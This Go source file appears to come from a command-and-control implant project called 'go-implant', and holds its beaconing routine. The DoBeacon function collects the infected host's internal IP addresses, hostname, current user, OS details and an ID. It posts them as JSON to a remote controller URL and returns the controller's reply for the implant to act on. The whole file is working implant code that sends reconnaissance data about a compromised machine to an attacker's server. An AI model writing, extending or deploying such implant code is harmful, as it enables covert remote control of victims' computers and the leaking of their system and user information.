package beaconing

import (
	"go-implant/client/config"
	"go-implant/common/communication"
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"time"
)

// DoBeacon does POST request to url and returns the reply
func DoBeacon(url string) ([]byte, error) {

	if config.DEBUG {
		log.Printf("Beaconing on %s", url)
	}

	// get interfaces on each beacon, they might have changed
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	ips := []string{}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			return nil, err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ips = append(ips, ip.String())
		}
	}

	// build beacon
	mybeacon := communication.Beacon{Hostname: HOSTNAME, InternalIPS: ips, CurrentUser: USERNAME, OS: OSINFO, Sleeptime: config.Sleeptime, UID: UID}

	// convert beacon to json
	jsonStr, err := json.Marshal(mybeacon)
	if err != nil {
		if config.DEBUG {
			log.Printf("Could not marshal JSON (%s)", err)
		}
		return nil, err
	}

	// build http request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	req.Header.Set("User-Agent", config.UserAgent)
	req.Header.Set("Content-Type", "application/json")
	req.Close = true // close connection after transaction complete

	// send the request
	// #########################
	// TODO: remove these to enable cert verification
	tr := &http.Transport{
		//TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// #########################
	client := &http.Client{Transport: tr, Timeout: time.Second * 10} // set timeout for client
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close() // close the request body - otherwise connection is kept alive indefinitely

	if config.DEBUG {
		log.Println("Beacon Status:", resp.Status)
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return body, nil
}
